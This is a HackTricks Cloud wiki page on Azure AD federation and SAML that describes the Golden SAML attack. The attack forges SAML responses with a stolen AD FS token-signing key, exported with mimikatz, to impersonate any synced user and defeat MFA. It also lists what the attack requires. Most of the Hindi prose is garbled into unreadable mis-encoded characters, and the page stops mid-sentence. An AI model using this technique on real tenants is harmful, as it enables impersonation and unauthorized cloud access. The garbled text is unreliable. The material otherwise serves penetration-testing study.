# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed) **Federation** рдПрдХ **рдбреЛрдореЗрди** рдХрд╛ рд╕рдВрдЧреНрд░рд╣ рд╣реИ рдЬрд┐рд╕рдиреЗ **рд╡рд┐рд╢реНрд╡рд╛рд╕** рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рд╣реИред рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд╛ рд╕реНрддрд░ рднрд┐рдиреНрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдорддреМрд░ рдкрд░ рдЗрд╕рдореЗрдВ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд▓рдЧрднрдЧ рд╣рдореЗрд╢рд╛ **рдкреНрд░рд╛рдзрд┐рдХрд░рдг** рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд╕рдВрдШ рдореЗрдВ **рдХрдИ рд╕рдВрдЧрдарди** рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ **рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдПрдХ рд╕реЗрдЯ рддрдХ рд╕рд╛рдЭрд╛ рдкрд╣реБрдВрдЪ** рдХреЗ рд▓рд┐рдП **рд╡рд┐рд╢реНрд╡рд╛рд╕** рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рд╣реИред

рдЖрдк рдЕрдкрдиреЗ **рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕реЗрд╕** рд╡рд╛рддрд╛рд╡рд░рдг рдХреЛ **Azure AD** рдХреЗ рд╕рд╛рде **рдлреЗрдбрд░реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╕рдВрдШ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рд╕рд╛рдЗрди-рдЗрди рд╡рд┐рдзрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕реЗрд╕** рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рдЕрдзрд┐рдХ рдХрдареЛрд░ рд╕реНрддрд░ рдХреЗ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред **AD FS** рдФрд░ PingFederate рдХреЗ рд╕рд╛рде рд╕рдВрдШ рдЙрдкрд▓рдмреНрдз рд╣реИред

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

рдореВрд▓ рд░реВрдк рд╕реЗ, рд╕рдВрдШ рдореЗрдВ, рд╕рднреА **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** **рдСрди-рдкреНрд░рд┐рдо** рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рднреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ SSO рдХрд╛ рдЕрдиреБрднрд╡ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ **рдСрди-рдкреНрд░рд┐рдо рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд▓рд╛рдЙрдб** рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рддрдХ **рдкрд╣реБрдВрдЪ** рд╕рдХрддреЗ рд╣реИрдВред

**Security Assertion Markup Language (SAML)** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреНрд░рджрд╛рддрд╛** рдХреЗ рдмреАрдЪ рд╕рднреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг **рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ **рдЖрджрд╛рди-рдкреНрд░рджрд╛рди** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдХрд┐рд╕реА рднреА рд╕рдВрдШ рд╕реЗрдЯрдЕрдк рдореЗрдВ рддреАрди рдкрдХреНрд╖ рд╣реЛрддреЗ рд╣реИрдВ:

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ
* рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ (IdP)
* рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ (SP)

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди (рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдпрд╛ SP, рдЬреИрд╕реЗ AWS рдХрдВрд╕реЛрд▓ рдпрд╛ vSphere рд╡реЗрдм рдХреНрд▓рд╛рдЗрдВрдЯ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдЪрд░рдг рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реАрдзреЗ IdP (рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛) рдкрд░ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред
2. рдЗрд╕рдХреЗ рдмрд╛рдж, SP рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд IdP (рдЬреИрд╕реЗ, AD FS, Okta) рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░ рдпрд╣ рдПрдХ SAML (Security Assertion Markup Language) AuthnRequest рддреИрдпрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЪреБрдиреЗ рд╣реБрдП IdP рдкрд░ рдкреБрдирдГ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред
3. IdP рдХрд╛рд░реНрдпрднрд╛рд░ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рддрд╛ рд╣реИред рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж, IdP рджреНрд╡рд╛рд░рд╛ рдПрдХ SAMLResponse рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SP рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
4. рдЕрдВрдд рдореЗрдВ, SP SAMLResponse рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдорд╛рдиреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ IdP рдХреЗ рд╕рд╛рде рдПрдХ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рд▓реЙрдЧрд┐рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╕рдорд╛рдкрди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рдпрджрд┐ рдЖрдк SAML рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рд╕рд╛рдорд╛рдиреНрдп рд╣рдорд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЬрд╛рдПрдВ:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS рдПрдХ рджрд╛рд╡реЛрдВ-рдЖрдзрд╛рд░рд┐рдд рдкрд╣рдЪрд╛рди рдореЙрдбрд▓ рд╣реИред
* "..рджрд╛рд╡реЗ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХрдерди рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд╛рдо, рдкрд╣рдЪрд╛рди, рд╕рдореВрд╣), рдЬреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдХрд╣реАрдВ рднреА рд╕реНрдерд┐рдд рджрд╛рд╡реЛрдВ-рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред"
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рджрд╛рд╡реЗ SAML рдЯреЛрдХрди рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдЦреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ IdP рджреНрд╡рд╛рд░рд╛ рдЧреЛрдкрдиреАрдпрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред
* рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ ImmutableID рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╡реИрд╢реНрд╡рд┐рдХ рд░реВрдк рд╕реЗ рдЕрджреНрд╡рд┐рддреАрдп рд╣реИ рдФрд░ Azure AD рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИред
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП ms-DS-ConsistencyGuid рдХреЗ рд░реВрдк рдореЗрдВ рдСрди-рдкреНрд░рд┐рдо рдореЗрдВ ImmutableID рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░/рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ GUID рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims) рдореЗрдВ рд╣реИред

**Golden SAML attack:**

* ADFS рдореЗрдВ, SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдПрдХ рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛрддреА рд╣реИред
* рдпрджрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ Azure AD рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ Azure AD рдХреЗ рд╕рд╛рде рд╕рд┐рдВрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ!
* рд╣рдорд╛рд░реЗ PTA рджреБрд░реБрдкрдпреЛрдЧ рдХреА рддрд░рд╣, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдкрд░рд┐рд╡рд░реНрддрди рдпрд╛ MFA рдХрд╛ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдкрдбрд╝реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдо рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЬрд╛рд▓реА рдмрдирд╛ рд░рд╣реЗ рд╣реИрдВред
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ DA рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде AD FS рд╕рд░реНрд╡рд░ рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдЬреБрдбрд╝реЗ рдорд╢реАрди рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps) рдореЗрдВ рд╣реИред

### Golden SAML

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЬрд╣рд╛рдВ рдПрдХ **рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ (IdP)** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдЗрди-рдЗрди рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **SAMLResponse** рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ, рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред IdP рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ **IdP рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд** рдпрд╛ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ (SP)** рдХреЛ SAMLResponse рдХреА рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рддреА рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп IdP рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

[рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдЕрдЯреИрдХ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдорд╛рдирд╛рдВрддрд░ рдЦреАрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдХреБрдВрдЬреА (рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдХреЗ рд▓рд┐рдП KRBTGT, рдЧреЛрд▓реНрдбрди SAML рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд┐рдЬреА рдХреБрдВрдЬреА) рдХреЛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд╕реНрддреБ** (TGT рдпрд╛ SAMLResponse) рдХреЛ рдЬрд╛рд▓реА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрд░рдлреЗрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SP рддрдХ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИред

рдЧреЛрд▓реНрдбрди SAML рдХреЗ рдХреБрдЫ рдлрд╛рдпрджреЗ рд╣реИрдВ:

* рдЗрдиреНрд╣реЗрдВ **рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ** рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рд╢реНрди рдореЗрдВ рдбреЛрдореЗрди рдпрд╛ рд╕рдВрдШ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
* рдпреЗ **рдЯреВ-рдлреИрдХреНрдЯрд░ рдСрдереЗрдВрдЯрд┐рдХреЗрд╢рди (2FA)** рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдкрд░ рднреА рдкреНрд░рднрд╛рд╡реА рд░рд╣рддреЗ рд╣реИрдВред
* рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ **рдирд┐рдЬреА рдХреБрдВрдЬреА рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд╡реАрдиреАрдХреГрдд рдирд╣реАрдВ рд╣реЛрддреА**ред
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдиреЗ рд╕реЗ** рдкрд╣рд▓реЗ рд╕реЗ рдЙрддреНрдкрдиреНрди SAML рдЕрдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) рдПрдХ Microsoft рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рднрд╛рдЧреАрджрд╛рд░реЛрдВ (рд╕рдВрдШ)** рдХреЗ рдмреАрдЪ рдкрд╣рдЪрд╛рди рдЬрд╛рдирдХрд╛рд░реА рдХреЗ **рд╕реБрд░рдХреНрд╖рд┐рдд рдЖрджрд╛рди-рдкреНрд░рджрд╛рди** рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ рдбреЛрдореЗрди рд╕реЗрд╡рд╛ рдХреЛ рдПрдХ рд╕рдВрдШ рдХреЗ рднреАрддрд░ рдЕрдиреНрдп рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣рдЪрд╛рди рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

AWS рдХреЗ рд╕рд╛рде рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдбреЛрдореЗрди (рдПрдХ рд╕рдВрдШ рдореЗрдВ) рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддреЗ рд╣реБрдП, рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **AWS рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП **SAML рд╡рд╕реНрддреБрдУрдВ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдирд┐рдЬреА рдХреБрдВрдЬреА** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рд╣рдорд▓реЗ рдореЗрдВ KRBTGT рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП AD FS рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред

рдЧреЛрд▓реНрдбрди SAML рд╣рдорд▓реЗ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* **рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд┐рдЬреА рдХреБрдВрдЬреА**
* **IdP рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░**
* **IdP рдирд╛рдо**
* **рднреВрдорд┐рдХрд╛ рдирд╛рдо (рднреВрдорд┐рдХрд╛ рдХреЛ рдЧреНрд░рд╣рдг рдХрд░рдирд╛)**
* рдбреЛрдореЗрди\рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо
* AWS рдореЗрдВ рднреВрдорд┐рдХрд╛ рд╕рддреНрд░ рдирд╛рдо
* рдЕрдореЗрдЬрд╝рди рдЦрд╛рддрд╛ рдЖрдИрдбреА

_рдХреЗрд╡рд▓ рдмреЛрд▓реНрдб рдореЗрдВ рдЖрдЗрдЯрдо рдЕрдирд┐рд╡рд╛рд░реНрдп рд╣реИрдВред рдЕрдиреНрдп рдХреЛ рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рднрд░рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред_

**рдирд┐рдЬреА рдХреБрдВрдЬреА** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **AD FS рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ** рддрдХ рдкрд╣реБрдВрдЪ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рд╡рд╣рд╛рдВ рд╕реЗ, рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ **рд╡реНрдпрдХреНрддрд┐рдЧрдд рд╕реНрдЯреЛрд░ рд╕реЗ рдирд┐рд░реНрдпрд╛рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ [mimikatz](https://github.com/gentilkiwi/mimikatz)ред рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк Microsoft.Adfs.Powershell рд╕реНрдиреИрдкрд┐рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ 